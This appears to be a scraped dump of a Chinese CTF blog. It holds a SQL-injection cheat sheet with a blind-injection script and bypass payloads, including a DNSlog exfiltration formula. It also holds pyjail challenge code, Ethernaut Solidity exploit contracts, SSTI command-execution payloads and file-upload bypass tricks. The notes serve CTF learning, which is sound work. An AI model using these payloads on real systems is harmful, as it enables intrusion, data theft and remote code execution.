limit {},1)--+&quot; for i in range(3000,10000): payloads = payload.format(i) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: char = chr(ord(table[-1])+1) table = table[0:-1]+char payld = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;+str(i)+&quot;,1)--+&quot; urls = url + payld res = requests.get(url=urls) #print(i) if 'You are in' not in res.text: print('从第',i,'行开始爆字段') #判断开始行数 n = i break return ndef columns(url,database,table,n): #无列名盲注爆字段值(可修改) while True: print(&quot;请输入要爆第几个字段，如：1,2等:&quot;,end='') x = int(input())-1 num = str(x + n) if x &lt; 0: break payload = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;',{},'',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef datas(url,table): #无列名盲注爆数据(可修改) while True: print(&quot;请输入要爆第几个数据，如：1,2等:&quot;,end='') x = int(input()) y = x-1 num = str(y) if y &lt; 0: break payload = &quot;1' and (&quot;+str(x)+&quot;,{},'')&gt;(table &quot;+table+&quot; limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakif __name__ == &quot;__main__&quot;: while True: print(&quot;请输入要操作的内容：\\n1.爆当前数据库\\n2.爆数据表开始行号\\n3.爆数据表\\n4.爆字段值开始行号\\n5.爆字段值\\n6.爆数据\\n7.爆所有数据库&quot;) types = int(input()) if types == 1: current_db(url) elif types == 2 or types == 3: print(&quot;请输入已经得到的数据库名:&quot;,end='') database = input() if types == 2: tables_n(url,database) elif types == 3: print(&quot;爆数据表开始行号:&quot;,end='') n = int(input()) tables(url,database,n) elif types == 4 or types == 5: print(&quot;请输入已经得到的数据库名:&quot;,end='') database = input() print(&quot;请输入已经得到的数据表名:&quot;,end='') table = input() if types == 4: columns_n(url,database,table) elif types == 5: print(&quot;爆字段值开始行号:&quot;,end='') n = int(input()) columns(url,database,table,n) elif types == 6: print(&quot;请输入要查询的数据表名:&quot;,end='') table = input() datas(url,table) else: dbs(url) 时间盲注原理都会，不讲了。 ascii判断:if(ascii(substr(查询语句,1,1))&gt;115,1,sleep(3))left语句判断:if(left(查询语句,1)='s',sleep(10),1) if(left(查询语句,2)='sa',sleep(10),1)substring函数判断:if(substring((查询语句),1,1='a'),11111,sleep(1)) 布尔注入同时间盲注，没啥东西 二次注入也没啥太多活能整，可以使用flask框架本地中转一下，把繁琐的步骤交给机器做。 堆叠注入能同时执行多条语句，要求比较高，这时候可以使用预编译了。可以参考这题整花活**[强网杯 2019]随便注**BUUCTF[强网杯 2019]随便注 的三种解法 Dnslog注入要求mysql权限比较高，同时还得能出网公式:select load_file(concat('\\\\',(查询语句),'.DNSLOG给的域名/任意字符' 搜索注入原理:mysql查询的时候，常用的是select * from sqltest where names like '%要查询的关键字%这时候就可以闭合%然后注入 宽字节注入 |使用了addslashes()函数 &amp;&amp; 数据库设置了编码模式为GBK原理: 前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞。 12345?id=%df' and 1=1 --+?id=%df' and 1=2 --+?id=-1%df' union select 1,2,3 %23 limit注入 | 数据库版本比较低原理:Mysql下Limit注入方法公式:SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,查询语句)),1); Bypass空格两个空格代替一个空格，用Tab代替空格，%a0=空格,括号代替空格,注释/*注释*/ 引号 | 十六进制这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了： select column_name from information_schema.tables where table_name=0x7573657273 逗号在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2# 等价于 union select * from (select 1)a join (select 2)b 使用like: select ascii(mid(user(),1,1))=80 # 等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 绕过比较符号()（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）： 使用greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句： select * from users where id=1 and ascii(substr(database(),0,1))&gt;64 此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句: select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 Between注入主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常 注between 1 and 1; 等价于 =1 WHERE可以使用having ,但是having只能用前面select已经选择的列名 12select goods_price,goods_name from sw_goods where goods_price &gt; 100select goods_price,goods_name from sw_goods having goods_price &gt; 100 过滤information_schema可以查表名: InnoDb引擎从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。只需要把infromation_schema换成mysql.innodb_table_stats sys数据库在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。只需要把information_schema换成sys.schema_auto_increment_columns就行了，其他的完全一样 之后就需要无列名注入了 SLEEP睡不了？就想办法让sql干重活慢下来concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b' or and xor not绕过：and=&amp;&amp; or=|| xor=| not=! 绕过注释符（#，–(后面跟一个空格））过滤： id=1' union select 1,2,3||'1 最后的or ‘1闭合查询语句的最后的单引号，或者： id=1' union select 1,2,'3 绕过等于号使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; 其他的bypass手段:这个就看题目环境了，题目里随机多样，但是万变不离其宗。 Sqlmap科技未完待续 相关链接:Sqli通关flask框架exp函数溢出注入MySQL注入指北group_by注入group_by报错注入BIGINT报错注入SQL注入关联分析浅谈利用mysql8新特性进行SQL注入SQL注入之无列名注入","link":"/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"","text":"[Week1]calc_jail_beginner_level2.5(JAIL)12345678910111213141516171819202122232425262728293031323334353637#the length is be limited less than 13#it seems banned some payload #banned some unintend sol#Can u escape it?Good luck!def filter(s): BLACKLIST = [&quot;exec&quot;,&quot;input&quot;,&quot;eval&quot;] for i in BLACKLIST: if i in s: print(f'{i!r} has been banned for security reasons') exit(0)WELCOME = ''' _ _ _ _ _ _ _ ___ _____ | | (_) (_) (_) | | | |__ \\ | ____| | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | ) | | |__ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | |/ _ \\ \\ / / _ \\ | / / |___ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\ V / __/ |/ /_ _ ___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____(_)____/ __/ | _/ | |___/ |__/ '''print(WELCOME)print(&quot;Welcome to the python jail&quot;)print(&quot;Let's have an beginner jail of calc&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)input_data = input(&quot;&gt; &quot;)filter(input_data)if len(input_data)&gt;13: print(&quot;Oh hacker!&quot;) exit(0)print('Answer: {}'.format(eval(input_data))) Unicode 欺骗https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E6%9E%81%E7%AB%AF%E9%99%90%E5%88%B6好棒的博客 [WEEK2]calc_jail_beginner_level5(JAIL)1#It\\'s an challenge for jaillevel5 let\\'s read your flag!\\nimport load_flag\\n\\nflag = load_flag.get_flag()\\n\\ndef main():\\n WELCOME = \\'\\'\\'\\n _ _ _ _ _ _ _ _____ \\n | | (_) (_) (_) | | | | ____|\\n | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | |__ \\n | \\'_ \\\\ / _ \\\\/ _` | | \\'_ \\\\| \\'_ \\\\ / _ \\\\ \\'__| | |/ _` | | | |/ _ \\\\ \\\\ / / _ \\\\ |___ \\\\ \\n | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\\\ V / __/ |___) |\\n |_.__/ \\\\___|\\\\__, |_|_| |_|_| |_|\\\\___|_| | |\\\\__,_|_|_|_|\\\\___| \\\\_/ \\\\___|_|____/ \\n __/ | _/ | \\n |___/ |__/ \\n\\'\\'\\'\\n print(WELCOME)\\n print(&quot;It\\'s so easy challenge!&quot;)\\n print(&quot;Seems flag into the dir()&quot;)\\n repl()\\n\\n\\ndef repl():\\n my_global_dict = dict()\\n my_global_dict[\\'my_flag\\'] = flag\\n input_code = input(&quot;&gt; &quot;)\\n complie_code = compile(input_code, \\'&lt;string&gt;\\', \\'single\\')\\n exec(complie_code, my_global_dict)\\n\\nif __name__ == \\'__main__\\':\\n main()","link":"/2022/10/12/HNctf/"},{"title":"Ethernaut刷题记录","text":"踩坑记录来自这里 可见修饰符publicprivateethernaut0.注意事项 @openzeppelin/contracts/math/SafeMath.sol 的地址已经迁移，做这个靶场的时候得自己手动改成&quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;; 以太坊主网即将进行合并，Rinkeby测试网络将于一年后停止运行，到时候就不知道这个靶场是否还会继续运行 不同版本的solidity语言特性不一样，可能会有兼容问题 Rinkeby的测试以太难以大量获取，做题不要一股脑把以太全塞进去了 1.Fallout描述12345678910111213这很白痴是吧? 真实世界的合约必须安全的多, 难以入侵的多, 对吧?实际上... 也未必.Rubixi的故事在以太坊生态中非常知名. 这个公司把名字从 'Dynamic Pyramid' 改成 'Rubixi' 但是不知道怎么地, 他们没有把合约的 constructor 方法也一起更名:contract Rubixi { address private owner; function DynamicPyramid() { owner = msg.sender; } function collectAllFees() { owner.transfer(this.balance) } ...这让攻击者可以调用旧合约的constructor 然后获得合约的控制权, 然后再获得一些资产. 是的. 这些重大错误在智能合约的世界是有可能的. 合约代码12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; }} 解:扔到remix里面调用Fal1out()函数就行了 2.Coin Flip描述这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。 合约代码123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } }} 解:以太坊网络经典难题:熵的产生 使用区块哈希产生的随机数很容易被预测(只需要和它在同一个区块上就行了)，只需要写个中继合约打进去就行了（原来的合约基础之上改一点点就行了） 1234567891011121314function exp() public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; c = CoinFlip(targetAddress); c.flip(side);} 注意：在某些预测随机数的题目中会返还以太，经常出现合约逻辑没有任何问题，但是就是运行出错的问题。 当合约收到一个calldata为空的call时，receive函数会被调用。这个函数会在执行一些以太币转账操作时被执行，常见的以太币转账操作包括.send()、.transfer()函数发起的转账。如果没有receive函数存在，但是存在一个payable属性的fallback函数的话，这个fallback函数会在一次以太币转账中被调用。如果一个合约既没有receive函数也没有payable属性的fallback函数，那么这个合约不能通过常规的交易来接收以太币，并且会抛出一个异常。 3.Telephone合约代码12345678910111213141516pragma solidity ^0.6.0;contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } }} 解:tx.orgin指的是交易的发起方，msg.sender是直接调用的一方，所以直接写合约调用这个函数就行了 123456789101112131415161718192021pragma solidity ^0.4.11;interface Telephone { function changeOwner(address _owner) external;}contract exploit { address targetAddr; Telephone t; address myaddr; function setInstance(address _targetAddr,address _myaddr) public { targetAddr=_targetAddr; myaddr= _myaddr; } function exp () public { t = Telephone(targetAddr); t.changeOwner(myaddr); }} 4.Token合约代码1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token { mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }} 解:很easy 溢出就完事了转个 115792089237316195423570985008687907853269984665640564039457584007913129639935就行了 5. Delegation合约代码123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; }}contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } }} 解：老生常谈， delegatecall相当于是去目标合约那块把相关的函数代码复制过来运行，而在solidity是个编译型语言，且存储使用的是slot[]这个大数组，变量是写死在代码里面的，一旦目标合约的变量环境和当前合约的变量环境不一样，就出大事，这题都做烂了，懒得写了 6.Force描述123有些合约就是拒绝你的付款,就是这么任性 ¯\\_(ツ)_/¯这一关的目标是使合约的余额大于0 合约代码123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m)*/} 解：在Solidity里面，有个很特殊的自毁函数 selfdestruct(addr);随便写个合约，塞进去一个selfdestruct函数，然后指向题目 7.Vault合约代码123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } }} 解直接getStorageAt就行了，直接看 8.King合约代码12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; }} 解：1234567891011contract Attack { constructor(address payable target) public payable{ require(msg.value == 0.15 ether,&quot;Not enough!&quot;); target.call.gas(1000000).value(0.15 ether)(&quot;&quot;); } receive() external payable { revert(); }} 当submit题目打算回收“王权”时，它运行到king.transfer(msg.value);这一行时，由于king就是我们合约的地址，而我们合约的receive函数会执行revert，因此它会卡在这个状态无法执行，从而无法取回王权。 这个漏洞在实际合约中被用revert来执行DDos，让程序卡在某个状态无法运行。 麻了，在写攻击合约的时候又踩坑里了https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/ transfer:要求接收的智能合约中必须有一个fallback或者receive函数，否则会抛出一个错误(error)，并且revert（也就是回滚到交易前的状态）。而且有单笔交易中的操作总gas不能超过2300的限制。transfer函数会在以下两种情况抛出错误： 付款方合约的余额不足，小于所要发送的value 接收方合约拒绝接收支付 send:和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。 call: call函数和上面最大的区别在于，它没有gas的限制，使用call时EVM将所有gas转移到接收合约上，形式如下: (bool success, bytes memory data) = receivingAddress.call{value: 100}(“”); 将参数设置为空会触发接收合约的fallback函数，使用call同样也可以调用本合约内的函数，形式如下 (bool sent, bytes memory data) = _to.call{gas :10000, value: msg.value}(byte4(keccack256(“function_name(uint256)”,args))); 9.Re-entrancy合约代码123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Reentrance { using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;); if(result) { _amount; } balances[msg.sender] -= _amount; } } receive() external payable {}} 解合约在进行提币时，使用 require 依次判断提币账户是否拥有相应的资产，随后使用 msg.sender.call.value(amount)() 来发送 Ether，处理完成后相应修改用户资产数据。 首先，使用call进行转账是个比较危险的操作，因为call会将当前剩下的gas一并发过去，这就导致目标合约在发送以太过去后会有足够的gas运行攻击合约里的receive函数，而攻击合约里的receive又会去调用目标合约里的转账函数，此时目标合约里记录转账的变量还未被修改，因此又可以继续转账然后如此往复。 10.Elevator合约代码123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Building { function isLastFloor(uint) external returns (bool);}contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } }} 目标是让top变为true，只需要返回不同结果就可以了 继承抽象合约，然后写函数就完事了。 11.Privacy很简单的题目，想在区块链上保护自己的隐私，太离谱了。 12345678910111213141516171819202122232425262728293031// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */} 解：根据slot插槽，确定数据在哪里 123456slot[0] | (bool locked)|slot[1] |(uint256 ID )|slot[2] | (unit 16 awkwardness)(uint8 denomination)(unit8 flattening)|slot[3] |(bytes32[0] )|slot[4] |(bytes32[1] )|slot[5] |(bytes32[2] )| 合约中要求require(_key == bytes16(data[2])); 只需要web3.eth.getStroageAt(contract.address,5)然后截取结果的前32位发过去就行了 12. Gatekeeper One1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract GatekeeperOne { using SafeMath for uint256; address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { require(gasleft().mod(8191) == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; }} 解:gateOne()这个好过，写个合约就行了 gateTwo()这个也好过….?应该？，中继合约里面.call限制一下数字？ 13.Privacy123456789101112131415161718192021222324252627282930313233343536373839// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(now &gt; timeLock); _; } else { _; } } } 解:你写你的，我用我的 ERC20有自己的转账函数，咱为啥用他的转账函数呢? 16.delegate过 17. Recovery","link":"/2022/10/04/solidity/"},{"title":"SSTI学习","text":"首先是这广为人知的图片,就放在这里了,嗯，肥肠不错 0x01 从盘古开天辟地讲起…Python 一切皆对象首先，我们来梳理一下python里面错综复杂的关系python object基类_Python 一切皆对象 object是最顶层基类，object是type的实例，而type又继承object，type是自身的实例。 type也是自身的实例化，object创造type，type创造一切和他自己，有点像道生一，一生三，三生万物…..type连自己都不放过，把自己都变成了自己的对象。type自己实例化自己。 object是父子关系的顶端，所有的数据类型的父类都是它；type是类型实例关系的顶端，所有对象都是它的实例的。 0x02 SSTI 原理这是四大天王1234567{% ... %} for Statements {{ ... }} for Expressions to print to the template output {# ... #} for Comments not included in the template output # ... ## for Line Statements {%%} 主要用来声明变量，也可以用于条件语句和循环语句。 {% set c= 'kawhi' %} {% if 81==9*9 %}kawhi{% endif %} {% for i in ['1','2','3'] %}kawhi{%endfor%} {{}} 用于将表达式打印到模板输出，比如我们一般在里面输入2-1，2*2，或者是字符串，调用对象的方法，都会渲染出结果 {{2-1}} #输出1 {{2*2}} #输出4 我们通常会用4简单测试页面是否存在SSTI {##} 表示未包含在模板输出中的注释 ## 有和{%%}相同的效果 这里的模板注入主要用到的是{{}}和{%%} 类的知识总结12345678910111213141516171819202122232425262728__class__ 类的一个内置属性，表示实例对象的类。__base__ 类型对象的直接基类__bases__ 类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__() 返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ 初始化类，返回的类型是function__globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}current_app 应用上下文，一个全局变量。request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}g {{g}}得到&lt;flask.g of 'flask_ssti'&gt; 构造链思路: 找到父类&lt;type ‘object’&gt; —&gt; 寻找子类 —&gt; 找关于命令执行或者文件操作的模块。 首先，需要一个类 然后，需要获得object类，因为所有的类都是继承自它，可以用__base__,__mro__[-1]拿到 ‘’.class.bases[0] &lt;class ‘object’&gt; ‘’.class.base &lt;class ‘object’&gt; ‘’.class.mro[1] &lt;class ‘object’&gt;‘’.class.mro[-1] &lt;class ‘object’&gt; 然后，需要用__subclasses__()拿到子类列表 最后，在子类列表里面找到getshell的类 0x03 Bypass过滤这部分，已经有文章整理的非常好了，俺就懒得搬运了，挂个链接 Flask-jinja2 SSTI 一般利用姿势 Refence细说Jinja2之SSTI&amp;bypassPython魔法方法指南 - PyZhPython：实例讲解Python中的魔法函数（高级语法）Python type()函数：动态创建类Python的MROSSTI模板注入总结","link":"/2022/11/04/ssti%E5%AD%A6%E4%B9%A0/"},{"title":"文件上传备忘录","text":"0x01 文件上传-前端拦截 | 懂得都懂，前端拦截=无效操作js检查代码12345678910111213141516171819//upload-labs level1function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; }} 传个正常图，然后抓包修改就行了。 0x02 文件上传-后端校验MINE | 懂的都懂，还是无效操作只校验MIME1$_FILES['upload_file']['type'] == 'image/jpeg') 无效操作，直接修改就完事了 常见MIMETYPE audio/mpeg -&gt; .mp3 application/msword -&gt; .doc application/octet-stream -&gt; .exe application/pdf -&gt; .pdf application/x-javascript -&gt; .js application/x-rar -&gt; .rar application/zip -&gt; .zip image/gif -&gt; .gif image/jpeg -&gt; .jpg / .jpeg image/png -&gt; .png text/plain -&gt; .txt text/html -&gt; .html video/mp4 -&gt; .mp4 0x03 文件上传-扩展名校验 | 你这waf保熟吗？姿势1: 黑名单校验，但黑名单不全其他后缀:*.php、*.php3、*.php4、*.PHP、*.phtml、*.pht 姿势2: 白名单校验，但是有解析漏洞截断绕过 /?upload=shell.php%00.jpg -&gt; /?upload=shell.php 解析漏洞Apache服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件 AddType application/x-httpd-php .php .phtml 在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。 例如：shell.php.qwe.asd -&gt;shell.php NginxNginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 